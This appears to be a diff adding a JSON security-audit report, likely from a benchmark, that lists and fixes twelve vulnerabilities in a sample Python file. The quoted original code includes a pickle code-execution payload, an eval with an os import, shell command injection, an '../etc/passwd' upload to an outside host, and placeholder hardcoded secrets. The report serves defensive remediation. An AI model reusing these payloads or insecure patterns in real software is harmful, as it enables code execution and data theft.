@@ -1,0 +1,107 @@
+{
+  "summary": {
+    "total_vulnerabilities": 12,
+    "critical": 6,
+    "high": 3,
+    "medium": 3,
+    "low": 0
+  },
+  "details": [
+    {
+      "id": 1,
+      "file": "input.py",
+      "line_numbers": [9],
+      "original": "EXTERNAL_API_KEY = \"ABC123_SUPER_SECRET_API_KEY\"",
+      "updated": "EXTERNAL_API_KEY is read from environment (no hardcoded key)",
+      "fix_explanation": "Hardcoded API key removed; key must be provided via environment variable EXTERNAL_API_KEY. Severity: critical. Reason: hardcoded credentials in source can be exfiltrated and cannot be rotated."
+    },
+    {
+      "id": 2,
+      "file": "input.py",
+      "line_numbers": [10, 11],
+      "original": "DB_USER = \"admin\"\nDB_PASS = \"P@ssw0rd!\"",
+      "updated": "DB_USER/DB_PASS are read from environment (no hardcoded creds)",
+      "fix_explanation": "Database credentials removed from source and read from environment variables. Severity: critical. Reason: hardcoded DB credentials allow unauthorized DB access and credential reuse."
+    },
+    {
+      "id": 3,
+      "file": "input.py",
+      "line_numbers": [15],
+      "original": "requests.get(endpoint, headers=headers, verify=False)",
+      "updated": "requests.get(endpoint, headers=headers, timeout=HTTP_TIMEOUT)  # TLS verified by default",
+      "fix_explanation": "Disabled TLS verification removed and a timeout added. Severity: high. Reason: verify=False defeats TLS and enables MITM attacks; timeouts prevent resource exhaustion."
+    },
+    {
+      "id": 4,
+      "file": "input.py",
+      "line_numbers": [23],
+      "original": "cur.execute(f\"SELECT id FROM users WHERE username = '{username}' AND password = '{password}'\")",
+      "updated": "cur.execute(\"SELECT id FROM users WHERE username = ? AND password = ?\", (username, password))",
+      "fix_explanation": "Parameterized SQL query used instead of f-string interpolation. Severity: high. Reason: f-string/concatenation leads to SQL injection."
+    },
+    {
+      "id": 5,
+      "file": "input.py",
+      "line_numbers": [26, 27, 28],
+      "original": "cmd = f\"ping -n 1 {user_input}\"\nsubprocess.call(cmd, shell=True)",
+      "updated": "validate hostname; subprocess.run([...], shell=False, timeout=5)",
+      "fix_explanation": "Removed shell=True and validated input; used list-style subprocess.run with timeout. Severity: critical. Reason: shell=True + untrusted input enables command injection."
+    },
+    {
+      "id": 6,
+      "file": "input.py",
+      "line_numbers": [30, 31, 69],
+      "original": "profile = pickle.loads(serialized_data)\n...\nprint(load_user_profile(b\"cos\\nsystem\\n(S'echo hacked'...\"))",
+      "updated": "JSON-only deserialization (json.loads) with explicit rejection of pickle magic bytes",
+      "fix_explanation": "Removed unsafe pickle.loads usage and reject pickle input. Severity: critical. Reason: pickle deserialization of untrusted data allows arbitrary code execution."
+    },
+    {
+      "id": 7,
+      "file": "input.py",
+      "line_numbers": [34, 35, 73],
+      "original": "return eval(expr)\n...\nprint(eval_expression(\"__import__('os').getcwd()\"))",
+      "updated": "ast.literal_eval used (only safe Python literals allowed)",
+      "fix_explanation": "Replaced eval() with ast.literal_eval to restrict evaluation to literals. Severity: critical. Reason: eval on untrusted input leads to remote code execution."
+    },
+    {
+      "id": 8,
+      "file": "input.py",
+      "line_numbers": [37, 38, 76],
+      "original": "with open(path, \"w\") as f:\n    f.write(secret)\n...\nsave_secret_to_file(\"TOP_SECRET\", \"secrets.txt\")",
+      "updated": "save_secret_to_file requires SECRETS_DIR and writes with 0o600 permissions",
+      "fix_explanation": "Prevent writing secrets to arbitrary locations and enforce restrictive file permissions. Severity: medium. Reason: writing secrets to predictable or world-readable files risks disclosure."
+    },
+    {
+      "id": 9,
+      "file": "input.py",
+      "line_numbers": [41, 42, 43, 44, 77],
+      "original": "private_key = \"""-----BEGIN RSA PRIVATE KEY-----\nMIICWwIBAAKBgQC7...\n-----END RSA PRIVATE KEY-----\""\"\nreturn private_key\nprint(get_private_key())",
+      "updated": "private key is read from a path given by PRIVATE_KEY_PATH (no inline key); printing suppressed",
+      "fix_explanation": "Removed embedded private key and require OS-protected storage. Severity: critical. Reason: private keys in source are irrecoverably exposed and cannot be rotated safely."
+    },
+    {
+      "id": 10,
+      "file": "input.py",
+      "line_numbers": [47, 48, 49, 50, 79],
+      "original": "with open(file_path, \"rb\") as f:\n    data = f.read()\nrequests.post(destination, data=data)\n...\nupload_file(\"../etc/passwd\", \"https://upload.example.com/\")",
+      "updated": "upload_file enforces ALLOWED_UPLOAD_DIR and ALLOWED_UPLOAD_HOSTS and uses a timeout",
+      "fix_explanation": "Validated upload source and destination to prevent arbitrary file exfiltration. Severity: critical. Reason: original code allows arbitrary file read and exfiltration (local file disclosure)."
+    },
+    {
+      "id": 11,
+      "file": "input.py",
+      "line_numbers": [52, 53, 54, 55, 56, 82],
+      "original": "token = os.getenv(\"SERVICE_TOKEN\")\nif not token:\n    token = \"DEFAULT_TOKEN_IN_CODE\"\nreturn token\nprint(get_env_token_fallback())",
+      "updated": "get_env_token_fallback returns None if SERVICE_TOKEN not set (no insecure default)",
+      "fix_explanation": "Removed insecure default token and require explicit configuration. Severity: medium. Reason: hardcoded fallback tokens can be abused and bypass authentication."
+    },
+    {
+      "id": 12,
+      "file": "input.py",
+      "line_numbers": [58, 59, 60, 61, 62, 83],
+      "original": "tmp_path = \"/tmp/vuln_temp.txt\"\nwith open(tmp_path, \"w\") as f:\n    f.write(data)\nreturn tmp_path\nprint(insecure_temp_file_write(\"temporary data\"))",
+      "updated": "use tempfile.NamedTemporaryFile with restrictive permissions (0o600)",
+      "fix_explanation": "Replaced predictable temporary filename with secure temporary file API. Severity: medium. Reason: predictable temp files allow race/TOCTOU and data leakage."
+    }
+  ]
+}
